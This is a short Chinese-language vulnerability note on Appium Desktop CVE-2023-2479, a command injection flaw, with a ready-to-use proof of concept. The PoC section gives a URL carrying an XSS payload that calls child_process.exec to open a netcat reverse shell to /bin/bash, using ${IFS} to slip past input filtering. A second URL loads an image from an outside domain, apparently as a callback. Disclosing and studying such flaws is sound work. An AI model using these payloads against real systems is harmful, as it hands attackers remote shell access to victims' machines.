## Appium Desktop CVE-2023-2479漏洞

appium-desktop 是 Appium 服务器的图形界面，也是一个应用程序检查器

由于用户输入审查不当，此软件包的受影响版本容易受到命令注入的攻击，允许攻击者设置反向 shell。


## poc
```
http://127.0.0.1/?xss=<img/src="1"/onerror=eval("require('child_process').exec('nc${IFS}localhost${IFS}4444${IFS}-e${IFS}/bin/bash');");>

http://127.0.0.1/?url=<img/src="http://nbjfpetfmu.dgrh3.cn"> 

```
